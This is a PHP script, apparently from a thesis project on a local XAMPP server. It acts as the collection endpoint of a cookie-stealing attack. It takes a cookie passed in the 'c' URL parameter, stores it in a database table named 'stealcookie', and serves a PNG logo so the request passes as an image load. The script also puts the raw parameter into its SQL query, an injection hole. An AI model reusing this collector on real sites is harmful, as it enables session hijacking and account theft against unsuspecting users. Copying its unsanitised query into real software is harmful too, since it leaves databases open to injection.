<?php  

ob_start();

require_once('connection.php');
$ck = $_GET["c"];
	$sql = "INSERT INTO szdoga.stealcookie (stolencookie) VALUES ('$ck')";
	$result = mysqli_query($kapcsolat, $sql);
	
	$fileHandle=fopen('C:/xampp/htdocs/szakdolgozat/logoszd.png', 'rb');
	$fileData = fread( $fileHandle, filesize('C:/xampp/htdocs/szakdolgozat/logoszd.png') );
	fclose( $fileHandle );
	$data = $fileData;
	
	header('Content-Type: image/png');
	header('Content-Length: ' . filesize('C:/xampp/htdocs/szakdolgozat/logoszd.png'));
	
	echo $data;

?>

